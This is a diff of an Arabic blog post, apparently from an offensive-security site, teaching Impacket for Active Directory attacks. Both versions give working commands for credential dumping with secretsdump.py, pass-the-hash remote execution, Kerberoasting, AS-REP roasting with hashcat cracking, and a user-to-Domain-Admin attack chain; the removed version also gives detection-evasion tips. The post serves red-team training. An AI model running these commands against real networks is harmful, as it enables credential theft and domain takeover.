@@ -1,122 +1,119 @@
 ---
 layout: blog
-title: "Impacket: السكاكين السويسرية للـ Red Team في هجمات Windows و Active Directory"
-date: 2026-04-01T05:09:31Z
+title: "Impacket: السكاكين السويسرية للـ Red Team - دليل شامل لاستغلال بروتوكولات Windows"
+date: 2026-04-01T06:24:56Z
 category: "أداة"
-excerpt: "في كل عملية Red Team ناجحة، تجد Impacket حاضرة. هذه المكتبة البرمجية ليست مجرد أداة، بل نظام بيئي متكامل لاستغلال بروتوكولات Windows. من الحصول على credentials إلى الـ lateral movement، Impacket تقدم أدوات قوية مكتوبة بـ Python لاختبار أمان Active Directory بفعالية."
+excerpt: "في عالم الـ Red Teaming، تبرز Impacket كمكتبة Python لا غنى عنها لكل مختص أمني. توفر هذه الأداة مجموعة ضخمة من الوظائف للتفاعل مع بروتوكولات Windows الشبكية. من استخراج الهاشات إلى تنفيذ الأوامر عن بُعد، تُعد Impacket الخيار الأول عندما يتعلق الأمر بـ Post-Exploitation في بيئات Active Directory."
 read_time: 8
-tags: ["Impacket", "Red Team", "Active Directory", "Penetration Testing", "Python"]
+tags: ["Impacket", "Red Team", "Active Directory", "Post Exploitation", "Python"]
 slug: "impacket-guide"
 image: "/OffsecAR/assets/images/blogs/impacket-guide.png"
 ---
 
 ## لماذا Impacket؟
 
-عندما تتحدث مع محترفي Offensive Security، ستجد Impacket في قائمة أدواتهم الأساسية. السبب بسيط: تمنحك وصولاً مباشراً لبروتوكولات Windows الحرجة دون الحاجة لتثبيت أدوات Windows الأصلية.
+عندما تحصل على موطئ قدم في شبكة Windows، تبدأ التحديات الحقيقية. تحتاج إلى التنقل، استخراج الأوثينتكيشن، والتحرك أفقيًا دون إثارة الشكوك. هنا يأتي دور Impacket.
 
-Impacket مكتبة Python توفر تطبيقات جاهزة لبروتوكولات مثل SMB، MSRPC، LDAP، و Kerberos. كتبها Core Security، وأصبحت المعيار الفعلي لأي عملية penetration testing على بيئات Windows.
+طُورت Impacket بواسطة SecureAuth وهي مكتبة Python تُنفذ بروتوكولات شبكية متعددة بطريقة نقية تمامًا. لا تعتمد على أي مكتبات Windows خارجية، ما يعني أنك تستطيع مهاجمة نظام Windows من جهاز Linux أو macOS بكل سهولة.
 
-الميزة الحقيقية؟ تعمل من Linux مباشرة. لا حاجة لـ Windows VM أو PowerShell remoting. فقط Python وفهم جيد لبنية Active Directory.
+القوة الحقيقية لـ Impacket تكمن في تغطيتها الشاملة: SMB، MSRPC، LDAP، Kerberos، وغيرها. كل بروتوكول تحتاجه للتحرك في بيئة Active Directory متوفر وجاهز للاستخدام.
 
-## الأدوات الأساسية وحالات الاستخدام
+## الأدوات الأساسية في الترسانة
 
-### psexec.py: التنفيذ البعيد الكلاسيكي
+### secretsdump.py: استخراج الكنوز
 
-أداة psexec الأصلية من Sysinternals معروفة، لكن نسخة Impacket أقوى وأكثر مرونة:
+أول ما يبحث عنه أي Red Teamer هو credentials. أداة secretsdump تتيح لك استخراج NTLM hashes، Kerberos keys، وحتى LSA secrets مباشرة من Domain Controller أو أي نظام Windows.
 
 ```bash
-# باستخدام credentials صريحة
-psexec.py DOMAIN/user:password@10.10.10.50
+# استخراج من Domain Controller عبر الشبكة
+secretsdump.py domain/user:password@dc01.target.local
 
-# باستخدام Pass-the-Hash
-psexec.py -hashes :NTHASH administrator@10.10.10.50
+# استخراج من NTDS.dit محفوظ محليًا
+secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 
-# عبر Kerberos ticket
-psexec.py -k -no-pass administrator@DC01.domain.local
+# استخراج باستخدام Pass-the-Hash
+secretsdump.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 administrator@192.168.1.10
 ```
 
-تستخدم psexec.py الـ Service Control Manager لتشغيل أوامر. البديل الأخف؟ wmiexec.py الذي يعمل عبر WMI دون كتابة ملفات على الـ disk.
+الأداة تدعم عدة طرق للـ Authentication، من الـ Cleartext passwords إلى Kerberos tickets، ما يجعلها مرنة للغاية.
 
-### secretsdump.py: استخراج الـ Credentials
+### psexec.py وعائلته: التنفيذ عن بُعد
 
-الأداة الأهم في عمليات Post-Exploitation. تستخرج hashes من SAM، LSA secrets، وحتى NTDS.dit من Domain Controllers:
+مجموعة أدوات التنفيذ عن بُعد في Impacket متنوعة ولكل منها حالات استخدام محددة:
 
 ```bash
-# استخراج من جهاز محلي
-secretsdump.py DOMAIN/user:password@10.10.10.50
+# psexec: الكلاسيكي، يستخدم Service Control Manager
+psexec.py domain/admin:password@target.local
 
-# استخراج NTDS.dit من Domain Controller
-secretsdump.py -just-dc-ntlm DOMAIN/admin@DC01.domain.local
+# wmiexec: أقل ضجة، يستخدم WMI
+wmiexec.py domain/admin:password@target.local
 
-# استخراج كل شيء بما فيها Kerberos keys
-secretsdump.py -just-dc DOMAIN/admin@DC01.domain.local
+# smbexec: بديل آخر عبر SMB
+smbexec.py domain/admin:password@target.local
+
+# atexec: للتنفيذ عبر Task Scheduler
+atexec.py domain/admin:password@target.local "whoami"
 ```
 
-سترى NTLM hashes لكل مستخدم في الـ domain. هنا تبدأ عمليات Pass-the-Hash و Credential Stuffing الحقيقية.
+كل أداة تترك Artifacts مختلفة. wmiexec أكثر هدوءًا من psexec لأنه لا يكتب ملفات على القرص، بينما atexec مفيد لجدولة المهام.
 
-### GetNPUsers.py: اصطياد AS-REP Roasting
+## هجمات Kerberos المتقدمة
 
-بعض الحسابات لا تتطلب Kerberos pre-authentication. خطأ تكويني شائع يمكن استغلاله:
+### GetUserSPNs.py: Kerberoasting
+
+أحد أشهر هجمات Active Directory. تستخرج Service Tickets لحسابات الخدمة ثم تكسرها Offline:
 
 ```bash
-# البحث عن حسابات vulnerable بدون credentials
-GetNPUsers.py DOMAIN.local/ -dc-ip 10.10.10.50 -usersfile users.txt -format hashcat
+# البحث عن SPN واستخراج TGS
+GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request
 
-# مع credentials للاستعلام عبر LDAP
-GetNPUsers.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request
+# حفظ الهاشات مباشرة
+GetUserSPNs.py domain/user:password -dc-ip 192.168.1.5 -request -outputfile hashes.txt
+
+# ثم كسرها باستخدام hashcat
+hashcat -m 13100 hashes.txt wordlist.txt
 ```
 
-الـ hashes الناتجة يمكن crack-ها offline باستخدام hashcat. نسبة النجاح؟ عالية جداً مع سياسات passwords ضعيفة.
+### GetNPUsers.py: AS-REP Roasting
 
-### GetUserSPNs.py: Kerberoasting الفعّال
-
-حسابات الخدمات (Service Accounts) مع SPNs هدف ثمين. تذاكر Kerberos الخاصة بها قابلة للـ crack:
+استهداف الحسابات التي لا تتطلب Kerberos Pre-Authentication:
 
 ```bash
-# طلب TGS tickets لكل SPNs
-GetUserSPNs.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request
+# فحص قائمة مستخدمين
+GetNPUsers.py domain/ -usersfile users.txt -dc-ip 192.168.1.5 -format hashcat
 
-# حفظ في صيغة hashcat مباشرة
-GetUserSPNs.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request -outputfile kerberoast.txt
+# فحص دومين كامل (يتطلب credentials)
+GetNPUsers.py domain/user:password -dc-ip 192.168.1.5 -request
 ```
 
-حسابات الخدمات غالباً تملك صلاحيات عالية و passwords قديمة. استثمار الوقت في cracking هذه التذاكر يؤتي ثماره.
+## سيناريو عملي: من Zero إلى Domain Admin
 
-## سيناريو عملي: من User إلى Domain Admin
-
-لنفترض حصولك على credentials لمستخدم عادي:
+لنفترض أنك حصلت على credentials لمستخدم عادي. إليك سير عمل نموذجي:
 
 ```bash
-# 1. Enumeration: البحث عن SPNs
-GetUserSPNs.py CORP.local/jdoe:Password123 -dc-ip 192.168.1.10 -request
+# 1. استكشاف الدومين والبحث عن SPN
+GetUserSPNs.py CORP/user:pass -dc-ip 10.0.0.5 -request
 
-# 2. Crack service account hash
+# 2. كسر TGS الناتج والحصول على حساب خدمة
 hashcat -m 13100 service.hash rockyou.txt
 
-# 3. استخدام الحساب الجديد للحصول على secretsdump
-secretsdump.py CORP.local/svc_sql:CrackedPass@192.168.1.10
+# 3. استخدام حساب الخدمة لـ DCSync
+secretsdump.py CORP/svc_account:password@10.0.0.5 -just-dc-user Administrator
 
 # 4. Pass-the-Hash للـ Administrator
-psexec.py -hashes :ADMINHASH administrator@192.168.1.10
+psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee administrator@10.0.0.5
 ```
 
-هذا المسار يحدث في عمليات حقيقية باستمرار. Impacket تسهّل كل خطوة.
+هذا المسار يوضح كيف تتكامل أدوات Impacket معًا لتشكيل Attack Chain متكاملة.
 
-## نصائح OPSEC وتجنب الكشف
+## نصائح للاستخدام الفعّال
 
-استخدام Impacket يترك آثاراً. بعض الممارسات لتقليل البصمة:
+**التخفي والـ OpSec**: wmiexec و dcomexec أقل إثارة للشبهات من psexec الذي يُنشئ خدمة جديدة. استخدم الأدوات المناسبة حسب مستوى المراقبة في البيئة المستهدفة.
 
-- **استخدم wmiexec.py بدلاً من psexec.py**: لا يكتب ملفات executable على الـ disk
-- **حذّر من Event IDs**: 4624 (Logon)، 4672 (Special Privileges)، و 5145 (Network Share Access)
-- **استخدم Kerberos بدلاً من NTLM** عندما ممكن: `export KRB5CCNAME=ticket.ccache`
-- **Rotate IPs والتوقيت**: لا تستخدم نفس الـ source باستمرار
+**إدارة الـ Tickets**: احتفظ بـ Kerberos tickets في ملفات منفصلة باستخدام `-k` flag. هذا يسمح لك بإعادة استخدامها دون الحاجة لـ credentials مرة أخرى.
 
-الـ EDR الحديثة تراقب SMB lateral movement بشكل مكثف. التنويع في التكتيكات ضروري.
+**التوثيق الكامل**: سجل كل أمر تنفذه. Impacket يولد بيانات كثيرة، والقدرة على إعادة تتبع خطواتك أمر حاسم في Engagements طويلة.
 
-## الخلاصة
+**الفهم العميق**: لا تستخدم الأدوات كـ Black Box. افهم البروتوكول الذي تستغله، الـ Artifacts التي تتركها، وكيف يمكن اكتشافك. هذا الفهم يفرق بين مهاجم ماهر ومستخدم Script Kiddie.
 
-Impacket ليست أداة واحدة، بل مجموعة أدوات متكاملة تغطي Attack Surface كامل لبيئات Windows. من Enumeration إلى Exploitation والـ Persistence، ستجد ما تحتاجه.
-
-الفهم العميق لـ Active Directory وبروتوكولاته شرط أساسي لاستخدام Impacket بفعالية. الأداة قوية، لكن المعرفة هي ما يحول commands بسيطة إلى تسلسل هجومي ناجح.
-
-في عملك القادم، قبل أن تبحث عن exploit معقد، راجع Impacket. غالباً، misconfiguration بسيط وأداة Impacket المناسبة كافيان للوصول لهدفك.
+Impacket ليست مجرد مجموعة أدوات، بل منصة كاملة لفهم واستغلال بروتوكولات Windows. إتقانها يضعك خطوات للأمام في أي Red Team engagement.
